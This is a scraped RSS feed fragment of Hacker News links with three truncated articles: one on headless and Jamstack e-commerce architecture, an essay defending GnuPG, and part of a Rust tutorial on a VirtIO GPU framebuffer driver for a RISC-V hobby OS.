            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058125">thread link</a>) | @rcymerys
<br/>
November 11, 2020 | https://upsidelab.io/blog/e-commerce-headless-jamstack/ | <a href="https://web.archive.org/web/*/https://upsidelab.io/blog/e-commerce-headless-jamstack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Web has gone a tremendously long way since it's conception in 1989. It has progressed to the point where it’s so omnipresent and the user base is so vast that it’s becoming harder and harder to scale and expand existing services to satisfy the ever growing demand. &nbsp;The <em>traditional </em>architecture is starting to show its limitations and suddenly it’s becoming clear that what was considered <strong>the way</strong> to develop web applications is not going to cut it under the current circumstances.</p><p><strong>Monolithic architecture</strong></p><p>Also known as the <em>traditional </em>architecture, is what powers the vast majority of what the Web has to offer. It’s the all-in-one bundle of web applications - the backend is tightly coupled with the frontend and the whole app is just one big ecosystem.</p><figure><img src="https://publish.upsidelab.io/blog/content/images/2020/09/final4.png" alt=""><figcaption>The monolithic architecture</figcaption></figure><p>For a big chunk of time this approach was the undisputed king of web development. And while it’s without a doubt still reigning and growing steadily, the consumer trends evolve in a direction that makes many service providers reconsider the usage of this kind of tools, namely WordPress.</p><p>Back in the day running a website was enough to ensure that you target the majority of Internet dwellers. Nowadays, thanks to some monumental advancements in technology, the users have many more ways to go online - phones, smartwatches, voice assistants, AR glasses etc.</p><figure><img src="https://publish.upsidelab.io/blog/content/images/2020/09/monolith_fail2.png" alt=""><figcaption>A monolith's problems with multi-channelled user base</figcaption></figure><p>This makes one of the problems very clear - because of how tightly coupled the presentational layer is with the backend logic it’s a major hassle (or downright impossible) to expand the application so it can support more channels than it was originally designed to do.</p><p>For example, one could imagine that it would be solvable by running multiple instances of the application, each designed to handle a specific medium. Apart from the obvious development overhead this would generate, managing multiple systems simultaneously would be a major headache - e.g. in e-commerce websites product discounts would have to be entered and synchronized separately for each running instance.</p><p>This is especially true for businesses that are heavily reliant on how accessible their web services are, most notably e-commerce websites. Expansion beyond the web is often the key to new market penetration and is often what distinguishes “just” successful ventures from market leaders.</p><p>Another thing that caused the shift away from monolithic architecture is the fact that the server would render pages visited by users with each request. This greatly impacts the user experience and makes the website feel less “snappy”.</p><p>While this is but a drop in the sea of shortcomings, it’s what widely believed to be the turning point and reason why alternative solutions are gaining traction exponentially.</p><p><strong>Headless architecture</strong></p><p>Despite its <em>buzzwordy</em> status nowadays, the concept of <em>headless </em>software is dead simple and has been around for ages. “Head” in this context means “graphical interface” - you can probably see where this is going. The <em>headless </em>approach completely removes the presentational layer, leaving just the backend logic that can be exposed through a universally accessible API layer.</p><figure><img src="https://publish.upsidelab.io/blog/content/images/2020/09/headless2.png" alt=""><figcaption>The headless architecture</figcaption></figure><p>Instead of a singular, tightly coupled with the logic and heavily specialized frontend, its focused on providing applications with the raw content/services it offers. One of such apps can be responsible for consuming the data and presenting it to the end user.</p><p>That’s precisely what’s needed when it comes to building multi-channel applications. Since the presentational layer is completely interchangeable and the core API is universally accessible, there could be multiple entry points interacting with the app, each designed to support a different medium.</p><figure><img src="https://publish.upsidelab.io/blog/content/images/2020/09/headless2-1-.png" alt="" srcset="https://publish.upsidelab.io/blog/content/images/size/w600/2020/09/headless2-1-.png 600w, https://publish.upsidelab.io/blog/content/images/size/w715/2020/09/headless2-1-.png 715w"><figcaption>Headless handling multi-channeled user base</figcaption></figure><p><strong>External integrations</strong></p><p>Nowadays, a big portion of an application’s features can be extracted to third-party SaaS platforms. Not only does this reduce a product’s time-to-market but, since they usually cover some highly technical features, can also improve the systems overall security. Some of them could be payment gateways, delivery services, ERP systems etc.</p><p>The most common monolithic choice on the Web is WordPress - a staple among traditional Content Management Systems. It offers a user-friendly interface for managing content and basic customizability through various plugins. There are extensions providing integrations with the most <em>common</em> of services which could prove sufficient for some very generic applications.</p><p>The word “common” was emphasised for a reason though. If the chosen platform doesn’t offer a specific plugin that is required by the project’s requirements, there is no other way but to either write it from scratch (often in some obscure technology) or change the platform. Keep in mind that even the largest of traditional CMSs doesn’t support a portion of the third-party platforms, so you can expect to run into situations where a part of your project’s scope gets blocked by an unexisting plugin.</p><p>On the other hand, headless architecture ties in very nicely with external services and applications. As emphasised before, headless benefits greatly by dividing its functionalities between multiple components. To draw comparison with the aforementioned WordPress, we can consider what’s called a <em>headless CMS</em>, such as GraphCMS or Contentful. It provides the same functionality, that is content storage and a user friendly administration panel, without coupling it with any presentational layer and crippling it’s extendability in the process.</p><p><strong>Scalability</strong></p><p>At first glance scaling monolithic applications seems trivial - multiple instances of it can be hidden behind a load balancer to scale horizontally. However, as the application grows in size, scaling becomes increasingly difficult and inefficient.</p><p>For example, it’s impossible to scale one single part of the application independently. In cases when there are few different bottlenecks scaling the entire system is very cost inefficient.</p><p>Moreover, for stateful applications, you have to take user sessions into account and incorporate mechanisms like <em>sticky sessions </em>to ensure that users with existing sessions are routed to the same physical machine each time.</p><p>On the other hand, it’s easy to imagine how headless can improve scalability - the application can be divided into autonomous services and scaled independently.</p><p><strong>Workflow differences</strong></p><p>Apart from the obvious structural differences, both approaches differ heavily when it comes to implementation, maintenance and development workflow in general.</p><p>Developer teams working on large monolithic applications have to constantly be aware of all the systems components and it’s impossible to work on a single part independently.</p><p>Moreover, continuous deployment is, to put it lightly, problematic when working on monolithic apps. With each new release the entire application has to be redeployed. This forces teams working on different parts of the system, e.g. the UI and the business logic, to coordinate their deployments.</p><p>On the other hand the compartmentalised nature of headless architecture makes it an ideal choice for teams consisting of multiple developers. Each part of the application can be independently managed, tested and deployed without interfering with the rest of the system.</p><p><strong>Enter Jamstack</strong></p><p>Jamstack is one of the hottest trends in web development right now. It’s focused on certain assumptions and best practices rather than on certain technologies. The performance and security improvements it brings to the table make it very popular among modern website developers and service providers.</p><p>At its core is the premise that the frontend doesn’t depend on a web server. All dynamic data is requested and handled by <strong>J</strong>avascript, delivered through <strong>A</strong>PI’s and all the <strong>M</strong>arkup is pre-generated during build time. The entire application is then distributed through a Content Delivery Network which greatly increases the websites responsiveness and improves overall user experience.</p><figure><img src="https://publish.upsidelab.io/blog/content/images/2020/09/headless1-1.png" alt="" srcset="https://publish.upsidelab.io/blog/content/images/size/w600/2020/09/headless1-1.png 600w, https://publish.upsidelab.io/blog/content/images/size/w714/2020/09/headless1-1.png 714w"><figcaption>The Jamstack</figcaption></figure><p>Jamstack stands in complete opposition to traditional, monolithic applications. It shifts the focus from an omniscient, one-man-army backend to lean and powerful frontend. Extracting all logic to external API’s improves the sites overall security by reducing the number of potential attack vectors.</p><p>As it happens, Jamstack works hand in glove with headless applications.</p><p><strong>Headless + Jamstack in practice</strong></p><p>Building Jamstack websites has become very easy since the conception of tools such as Nuxt or Gatsby. They are based on tools very familiar to developers, Vue and React respectively, so they are right there in the comfort-zone.</p><p>Such frameworks intelligently build HTML files from templates filled with pre-fetched data so they can be served through CDNs as static assets. This, as one might expect, is a huge boost to the site’s performance, making navigation almost instantaneous. CDN service providers also make it easy to force the use of SSL on your sites (sometimes it’s as simple as flipping a switch), which can otherwise be problematic since, by design, there is no underlying server.</p><p>Serving static assets is not that useful if there is no way of populating the site with easily modifiable content. That’s where the aforementioned headless CMS’s come into play. They offer exactly the same content modeling functionality as traditional solutions, such as WordPress, and expose it through a blazing fast API. The chosen Jamstack framework will pre-fetch all the data it needs during the page generation phase and build static HTML files according to the templates that were defined. That’s an ideal setup for websites like blogs or product catalogs, where user interaction is scarce and content serving speed is the main bottleneck.</p><p>There is one caveat though - since the pages are pre-generated, they won’t automatically display new content that was created. A good majority of SaaS’s offer a well-known mechanism to automatically trigger rebuilds when a change in content is …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://upsidelab.io/blog/e-commerce-headless-jamstack/">https://upsidelab.io/blog/e-commerce-headless-jamstack/</a></em></p>]]>
            </description>
            <link>https://upsidelab.io/blog/e-commerce-headless-jamstack/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058125</guid>
            <pubDate>Wed, 11 Nov 2020 13:22:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Defense of GnuPG]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058064">thread link</a>) | @m3rcury
<br/>
November 11, 2020 | https://www.oyd.org.tr/en/articles/defense-of-gpg/ | <a href="https://web.archive.org/web/*/https://www.oyd.org.tr/en/articles/defense-of-gpg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  <article>
    
     
      
    <p>For several years, there has been an uprasing against GPG. Every now and then someone writes up a blog post and condemn OpenPGP and it’s implementations for being too hard to use or too easy to mess up. The GPG side is mostly silent. So, this article is in defence of GPG.</p>
<p>Main points made against GPG can be listed like this:</p>
<ol start="0">
<li>GPG is too complicated for “normal” users</li>
<li>Because GPG is too complicated, it’s userbase is minuscule</li>
<li>Email is inherently impossible to secure so don’t even bother encrypting it. Just abandon GPG</li>
<li>Nobody bothers to read emails of “normal” people so don’t encrypt</li>
<li>TLS has done much more for email security than GPG</li>
<li>GPG is error prone and security wise it is dangerous for people to use it when actual security is needed</li>
<li>For various reasons, only cryptonerds use it and take pride on GPG so it is lame</li>
<li>GPG’s trust model (web of trust) is broken and only cryptonerds are keeping it alive</li>
<li>GPG is old</li>
<li>There are better [insert anything involving app like crypto tool] why bother with GPG</li>
<li>GPG crypto has [Insert any long term RSA based cryptography’s short comings and trust problems] why not use modern crypto</li>
</ol>
<p>During these discussion, these point are mostly assumed to be true;</p>
<ol start="0">
<li>People are stupid and lazy so are the users of encryption tools</li>
<li>Since users are stupid and lazy tools should be designed keeping that in mind</li>
<li>Designing for stupid and lazy requires stripping people from anything than needed(i.e freedom)</li>
<li>If security is not absolute it is worthless</li>
<li>If privacy is not absolute, anonymity is worthless</li>
<li>If your adversary cannot compromise  of your security then there is no need for GPG even for privacy</li>
</ol>
<h2 id="whats-the-problem">What’s The Problem</h2>
<p>We name periods of human history by their defining property. That property is mainly what drives human society and culture at that current age. The iron age was shaped by the superiority of iron as a material for weapons and agricultural tools. Today’s digitally shaped age is called <a href="https://www.schneier.com/essays/archives/2012/11/when_it_comes_to_sec.html">digital feudalism</a> and it governs our lives. Just like regular feudalism the resources of society is controlled by few, generated by many and the feudal lords of ours claim their right to their thrones through their infrastructure.</p>
<p>We as users are fueling the rise of the digital technologies but handful of companies are controlling and profiting from it. Just like peasants of the middle ages, you are seen as basic people who cannot understand the complex life that only a few selected elites can. It is what you are asusmed to be: simple people who wants simple things, like “apps” that will give you what you assumed to need and nothing more. It is the same old condescending view of serfs, now given to you by companies, ignorant and arrogant developers and overall by capitalism.</p>
<p>Today saying “what do I understand about computers” is equivalent to saying “I don’t know how to light a fire” in stone age! Just because someone might be feeding you back in those days did not mean that you could survive on your own. The same applies to current digital age. Just because someone is doing <strong>stuff</strong> for you does not ensure your digital survival. There was no easy way to light a fire back then and there will be no “press this button” easy way to take back the power in the digital age. Whoever claims people <strong>want</strong> or <strong>need</strong> only simple stupid apps and whoever denies the fact that we are living in digital feudalism are building a dystopian future where few elite unprecedentedly controls the future. Self determination is never given by anyone but can only be taken by everyone!</p>
<p>This ideology that “people are stupid” and “people want easy(read:stupid)” things dominates today’s end user software development. Good UX does not equal to simple. The real meaning in these expressions is: “you are too stupid to take responsibility for your self and to understand what’s going on, so we as technological elites will take care of you”. This is what’s the base of almost all GPG related criticism. GPG is too hard for people!</p>
<p>PGP, the preceder of GPG, was conceived in 1991 and this era was shaped by hackers. Not the hackers that main stream media shows in black hoods and authorities around the world paint as people with no moral boundaries. Hackers are the people who playfully expanded what is available to what is possible. This attitude brought general public; personal computers, GNU/Linux operating system that are now powering almost every backbone in the world, 3D printers etc. PGP was shaped by the empowerment of that era, not the “there is an app for that” era of today which is shaped by multi-billion dollar cooperation built upon the cultural and technological accumulation of hackers.</p>
<p>That brings us to the point: GPG is hard for people, but so were the general purpose computers around 20 years ago. Everything requires individual dedication and determination to learn and maintain. What happened with computers is that some people capitalised on the opportunity, poured money into devices and after hundreds of hours long R&amp;D those computers became “easy”. The outcome of that process was loss of the right to fix, more enclosed and restricted user environments and computers that works against us! So those who invested in computers can profit from their investment.</p>
<p>The same problem also exists for encryption. There was no real incentive for capitalists to invest in publicly accessible encryption. Solid encryption would make reaching data possible only for the user who owns it and this would be counter intuitive to the interest of capitalism. But today there is an incentive: people are afraid of what our digital world has become. They are afraid of their <a href="https://en.wikipedia.org/wiki/Global_surveillance_disclosures_(2013%E2%80%93present)">government’s abuse of power</a>, they are afraid of <a href="https://www.theguardian.com/technology/2017/sep/26/tinder-personal-data-dating-app-messages-hacked-sold">companies taking advantage of their lives</a>, they are afraid that their <a href="https://en.wikipedia.org/wiki/Facebook%E2%80%93Cambridge_Analytica_data_scandal">involment in democracy will be lost</a>. People are afraid and there is no better time to sell something. That’s why Apple is now selling <a href="https://en.wikipedia.org/wiki/FBI%E2%80%93Apple_encryption_dispute">privacy as a product</a> and that is why every communication service regardless their privacy invasive tendencies are <a href="https://faq.whatsapp.com/en/android/28030015/">promoting encryption</a>. What is missing is that people are still an object in this case. Whoever holds the key holds the future and there is no alternative to GPG that gives the user the best self determination!</p>
<p>So, how is GPG doing while the craze to own next killer encryption app continiue? <a href="https://en.wikipedia.org/wiki/Werner_Koch"><strong>Werner Koch</strong></a>, is the single person maintaining GPG. He was almost about to give up on GPG for <a href="https://www.propublica.org/article/the-worlds-email-encryption-software-relies-on-one-guy-who-is-going-broke">economic reasons</a> when the <a href="https://en.wikipedia.org/wiki/Edward_Snowden">Snowden incident</a> has chanced his decision. The world’s whole server infrastructure security and personal freedom rests on his shoulder and he had to ask for help. It is a huge difference in investment/impact ratio when compared to every other encryption tool. GPG exist by determination and not through capital pressure.</p>
<p>In every “GPG is dead” cry almost always includes some <strong>killer</strong> new technology that makes more <strong>sense</strong> than GPG. Let’s talk about them for a while.</p>
<h2 id="signal">Signal</h2>
<p>A big hit in secure instant messaging. Signal is build upon proprietary software Textsecure and RedPhone that had been once developed by <a href="https://en.wikipedia.org/wiki/Moxie_Marlinspike">Moxie Merlinspike</a> and his co-founder Stuart Anderson. Signal Protocol utilizing <a href="https://en.wikipedia.org/wiki/Double_Ratchet_Algorithm">double ratchet</a> encryption is a game changer for modern connectivity and implemented in [several applications[(https://signal.org/blog/whatsapp-complete/). Signal applications and server code is free software but <a href="https://oyd.org.tr/en/articles/stop-saying-freedom-is-a-private-matter/">their developers and business model is not</a>. It is <a href="#https://matrix.org/blog/2020/01/02/on-privacy-versus-freedom/">yet another walled garden with no federation</a> and <a href="https://moxie.org/blog/gpg-and-me/">claiming GPG is dead</a>.</p>
<h2 id="matrix-protocol">Matrix Protocol</h2>
<p><a href="https://en.wikipedia.org/wiki/Matrix_(protocol)">Matrix protocol</a> is an open standard for general communication needs. Like <a href="https://en.wikipedia.org/wiki/Xmpp">XMPP -Extensible Messaging and Presence Protocol-</a> it is designed to be implemented widely and serve various modern needs of communication. End-to-end encryption is falling behind and there are still implementation problems but if everything goes well Matrix Protocol could be a modern free future for communication. The only problem is that Matrix Protocol is still an instant communication system and the cryptography behind it is specialized only for that purpose.</p>
<h2 id="insert-any-app-or-protocol">[Insert Any App or Protocol]</h2>
<p>Almost all have some of these short comings:</p>
<ul>
<li>Walled Gardens with no federation</li>
<li>Non-free dependencies</li>
<li>Single purpose</li>
<li>Symmetrical communication while e-mail being asymmetrical</li>
<li>Opaque key generation and management</li>
</ul>
<p>Modern messaging softwares do have merits that are desirable such as <a href="https://en.wikipedia.org/wiki/Forward_secrecy">forward secrecy</a>, <a href="https://en.wikipedia.org/wiki/Elliptic_curve_cryptography">recent algorithms with shorter keys</a>(read: not necessarily more secure) and more frictionless key management(which heavily depends on central key servers and personal data). All these merits are, to some degree, desireable for GPG too but those tool’s have different design requirements than GPG. GPG can and will become better at most points. When the case is single person against a multi-billion dollar industry, this should not count as a fair trial.</p>
<p>What GPG is offering in exchange is <strong>freedom</strong>, not just another “app” that walls it’s users in and here is why:</p>
<h2 id="gpg-giving-you-the-total-control-of-your-key-and-identity">GPG giving you the TOTAL control of your key and identity</h2>
<p>This primary point is so important, the rest seems moot. GPG is the most liberating piece of software EVER. What GPG is capable of and how it is implemented almost always secondary to the fact that <strong>you</strong> as the user in need of cryptography <strong>control</strong> the key. You can export it, expand it, change it, renew it, <a href="https://github.com/intra2net/paperbackup">print it on paper</a>, revoke it. The fact that you own and control your key actually makes it possible for you to build your identity around that key. This is almost like being your own certificate authority and issuing your certificates as you please.</p>
<p>This comes with the trust problem of cryptopgraphy. If anyone can generate a key with any metadata, then who is deciding on a particular key belong to an individual. The answer is <strong>no one</strong> and <strong>everyone</strong>. <a href="https://en.wikipedia.org/wiki/Web_of_trust">Web of trust</a> is an answer to this question for most part. You basically sign keys of people who you know and the people who trust you, trusts your friends.</p>
<p>This implementation is <a href="https://web.archive.org/web/20131009142806/https://www.rubygems-openpgp-ca.org/blog/theres-trust-and-then-theres-trust-and-then-theres-trust.html">considered broken</a> by a lot of people and there is a natural down side of making your social network public. That being said building trust …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.oyd.org.tr/en/articles/defense-of-gpg/">https://www.oyd.org.tr/en/articles/defense-of-gpg/</a></em></p>]]>
            </description>
            <link>https://www.oyd.org.tr/en/articles/defense-of-gpg/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058064</guid>
            <pubDate>Wed, 11 Nov 2020 13:14:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Graphical Output from Our Custom RISC-V Operating System in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058039">thread link</a>) | @pavehawk2007
<br/>
November 11, 2020 | https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>An operating system is used to make our job easier when using graphics. In our instance, in addition to everything else. In this post, we will be writing a GPU (graphics processing unit) driver using the VirtIO specification. In here, we will allow user applications to have a portion of the screen as RAM–with what is commonly known as a <em>framebuffer</em>.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#overview">Overview</a></li><li><a href="#pixels">Pixels and Resolution</a></li><li><a href="#virtio">The GPU VirtIO Device</a></li><li><a href="#init">Initialization</a></li><li><a href="#invalid">Invalidation and Transfer</a></li><li><a href="#response">Device Responses</a></li><li><a href="#user">User Space</a></li><li><a href="#api">Simple Graphics API</a></li><li><a href="#conclusion">Conclusions and Further Reading</a></li></ol>



<hr>



<h2 id="overview">Overview</h2>



<p>We command the virtual GPU (virtio-gpu) by sending certain commands to the host (the device). The guest (the OS driver) has an allocation of RAM that becomes the framebuffer. The driver then tells the device, “hey, here’s the RAM that we’re going to use to store pixel information.”</p>



<p>The RAM is contiguous in our OS, but according to the specification, this isn’t strictly required. We will give the driver a rectangle. Everything that falls within that rectangle will be copied to the host. We don’t want to keep copying the entire buffer over and over again.</p>



<p>We will be using the virtio protocol that we used for the block driver here, so I won’t rehash the general virtio protocol. However, the device-specific structures are a bit different, so we’ll cover that part more in depth.</p>



<hr>



<h2 id="pixels">Pixels and Resolution</h2>



<p>A framebuffer must be large enough to store \(\text{width}\times\text{height}\times\text{pixel size}\) number of bytes. There are \(\text{width}\times\text{height}\) number of pixels. Each pixel has a 1-byte red, green, blue, and alpha channels. So, each pixel is exactly 4 bytes with the configuration we’re going to specify.</p>



<p>The framebuffer for our junior GPU driver is going to support a fixed resolution of \(640\times 480\). If you’re a child of the 90s, you saw this resolution a lot. In fact, my first computer, a Laser Pal 386, had a 16-color monitor with a resolution of 640 pixels wide with 480 pixels tall.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png" alt="" width="458" height="281" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png 611w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13-300x184.png 300w" sizes="(max-width: 458px) 100vw, 458px"></a></figure></div>



<p>There are red, green, and blue pixels so close together that by varying the intensity of these three channels, we can change the color. The closer we get to our monitors, the easier a pixel is to see.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png" alt="" width="285" height="288" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png 380w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14-297x300.png 297w" sizes="(max-width: 285px) 100vw, 285px"></a><figcaption>Pixels on a Viewsonic VX2770SMH-LED monitor.</figcaption></figure></div>



<p>You can see these little squares. If you squint enough, you can see that they aren’t pure white. Instead, you can see bits of red, blue, and green. That’s because each one of these little squares is subdivided into three colors: yep, red, green, and blue! To make white, these pixels are turned up to 11 (get the joke?). To make black, we turn off all three channels of that pixel.</p>



<p>The resolution refers to how many of these squares are on our monitor. This is a 1920×1080 monitor. That means that there are 1920 of these squares going left to right, and there are 1080 of these squares from top to bottom. All in all, we have \(1920\times 1080=2,073,600\) number of pixels. Each one of these pixels is expressed using 4 bytes in the framebuffer, meaning we need \(2,073,600\times 4=8,294,400\) bytes in RAM to store the pixel information.</p>



<p>You can see why I limited our resolution to 640×480, which only requires \(640\times 480\times 4=1,228,800\) bytes–a bit over a megabyte.</p>



<hr>



<h2 id="virtio">The GPU VirtIO Device</h2>



<p>The GPU device requires us to read a more up-to-date VirtIO specification. I’ll be reading from version 1.1, which you can get a copy here: <a href="https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html">https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html</a>. Specifically, chapter 5.7 “GPU Device”. This is an <em>unaccelerated</em> 2D device, meaning that we must use the CPU to actually form the framebuffer, then we transfer our CPU formulated memory location to the host GPU, which is then responsible for drawing it to the screen.</p>



<p>The device uses a request/response system, where we the driver make a command to request something from the host (the GPU).  We add a bit of extra memory into our request so that the host can formulate its response. When the GPU interrupts us, we can take a look at this response memory location to see what the GPU told us. This is much like the <em>status</em> field on the block driver, where the block device tells us the status of our last request.</p>



<p>Each request starts with a <em>Command Header</em>, which in Rust looks as follows:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(C)]
struct CtrlHeader {
	ctrl_type: CtrlType,
	flags: u32,
	fence_id: u64,
	ctx_id: u32,
	padding: u32
}</pre>



<p>The header is common for all requests and all responses. We can differentiate by the CtrlType enumeration, which is:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum CtrlType {
	/* 2d commands */
	CmdGetDisplayInfo = 0x0100,
	CmdResourceCreate2d,
	CmdResourceUref,
	CmdSetScanout,
	CmdResourceFlush,
	CmdTransferToHost2d,
	CmdResourceAttachBacking,
	CmdResourceDetachBacking,
	CmdGetCapsetInfo,
	CmdGetCapset,
	CmdGetEdid,
	/* cursor commands */
	CmdUpdateCursor = 0x0300,
	CmdMoveCursor,
	/* success responses */
	RespOkNoData = 0x1100,
	RespOkDisplayInfo,
	RespOkCapsetInfo,
	RespOkCapset,
	RespOkEdid,
	/* error responses */
	RespErrUnspec = 0x1200,
	RespErrOutOfMemory,
	RespErrInvalidScanoutId,
	RespErrInvalidResourceId,
	RespErrInvalidContextId,
	RespErrInvalidParameter,
}</pre>



<p>I took this directly from the specification, but Rust-ified the names to avoid getting yelled at by the linter.</p>



<h3>Pixel Formats</h3>



<p>Recall that the framebuffer is just a bunch of bytes in memory. We need to put a structure behind the framebuffer so the host (the GPU) knows how to interpret your sequence of bytes. There are several formats, but all-in-all, they just re-arrange the red, green, blue, and alpha channels. All are exactly 4 bytes, which makes the <em>stride</em> the same. The stride is the spacing from one pixel to another–4 bytes.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum Formats {
	B8G8R8A8Unorm = 1,
	B8G8R8X8Unorm = 2,
	A8R8G8B8Unorm = 3,
	X8R8G8B8Unorm = 4,
	R8G8B8A8Unorm = 67,
	X8B8G8R8Unorm = 68,
	A8B8G8R8Unorm = 121,
	R8G8B8X8Unorm = 134,
}</pre>



<p>The type, <em>unorm</em>, is an 8-bit (1-byte) unsigned value from 0 through 255, where 0 represents no intensity and 255 represents full intensity, and a number in between is a linear-interpolation between no and full intensity. Since there are three color (and one alpha), that gives us \(256\times 256\times 256=16,776,216\) different colors or levels of colors.</p>



<p>For this tutorial, I selected <code>R8G8B8A8Unorm = 67</code>, which has red first, green second, blue third, and alpha fourth. This is a common ordering, so I’ll select it to make it easy to follow along.</p>



<p>Our selected format makes the pixel structure look as follows:</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png" alt="" width="512" height="307" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-300x180.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-768x461.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1536x921.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-2048x1228.png 2048w" sizes="(max-width: 512px) 100vw, 512px"></a></figure></div>



<p>Recall that each individual component R, G, B, and A are each one byte a piece, so each Pixel referred to by (x, y) is 4 bytes. This is why our memory pointer is a Pixel structure instead of a byte.</p>



<hr>



<h2 id="init">Initialization</h2>



<p>Just like all other virtio devices, we set up the virtqueues first and then we work on device-specific initialization. In my code, I just directly copied-and-pasted from the block driver into the gpu driver. The only thing I added to the Device structure was the framebuffer and dimensions of the framebuffer.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">pub struct Device {
	queue:        *mut Queue,
	dev:          *mut u32,
	idx:          u16,
	ack_used_idx: u16,
	framebuffer:  *mut Pixel,
	width:        u32,
	height:       u32,
}</pre>



<p>The specification tells us to do the following in order to initialize the device and get things ready to draw. I Rust-ified some of the content to match our enumerations.</p>



<h4>Create a framebuffer and configure scanout</h4>



<ol><li>Create a host resource using <code>CmdResourceCreate2d</code>.</li><li>Allocate a framebuffer from guest ram, and attach it as backing storage to the resource just created, using <code>CmdResourceAttachBacking</code>.</li><li>Use <code>CmdSetScanout</code> to link the framebuffer to a display scanout.</li></ol>



<h3>A Request Structure</h3>



<p>Recall that our request and response come packaged together. We will put them in separate descriptors, but whenever we get a response back from the device, it is going to be easier if we free just once to free both the request and response. So, in Rust, I created the Request structure to support doing this.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct Request&lt;RqT, RpT&gt; {
	request: RqT,
	response: RpT,
}
impl&lt;RqT, RpT&gt; Request&lt;RqT, RpT&gt; {
	pub fn new(request: RqT) -&gt; *mut Self {
		let sz = size_of::&lt;RqT&gt;() + size_of::&lt;RpT&gt;();
		let ptr = kmalloc(sz) as *mut Self;
		unsafe {
			(*ptr).request = request;
		}
		ptr
	}
}</pre>



<h4>Step 1: Create host resource</h4>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">let rq = Request::new(ResourceCreate2d {
	hdr: CtrlHeader {
		ctrl_type: CtrlType::CmdResourceCreate2d,
		flags: 0,
		fence_id: 0,
		ctx_id: 0,
		padding: 0,
	},
	resource_id: 1,
	format: Formats::R8G8B8A8Unorm,
	width: dev.width,
	height: dev.height,
});
let desc_c2d = Descriptor {
	addr: unsafe { &amp;(*rq).request as *const ResourceCreate2d as u64 },
	len: size_of::&lt;ResourceCreate2d&gt;() as u32,
	flags: VIRTIO_DESC_F_NEXT,
	next: (dev.idx + 1) % VIRTIO_RING_SIZE as u16,
};
let desc_c2d_resp = Descriptor {
	addr: unsafe { &amp;(*rq).response as *const CtrlHeader as u64 },
	len: size_of::&lt;CtrlHeader&gt;() as u32,
	flags: VIRTIO_DESC_F_WRITE,
	next: 0,
};
unsafe {
	let head = dev.idx;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).desc[dev.idx as usize] = desc_c2d_resp;
	dev.idx = (dev.idx + 1) % VIRTIO_RING_SIZE as u16;
	(*dev.queue).avail.ring[(*dev.queue).avail.idx as usize % VIRTIO_RING_SIZE] = head;
	(*dev.queue).avail.idx = (*dev.queue).avail.idx.wrapping_add(1);
}</pre>



<p>All we’re really telling the GPU here is our resolution and the format of the framebuffer. When we create this, the host gets to configure itself, such as allocating an identical buffer to make transfers from our OS.</p>



<h4>Step 2: Attach framebuffer backing.</h4>



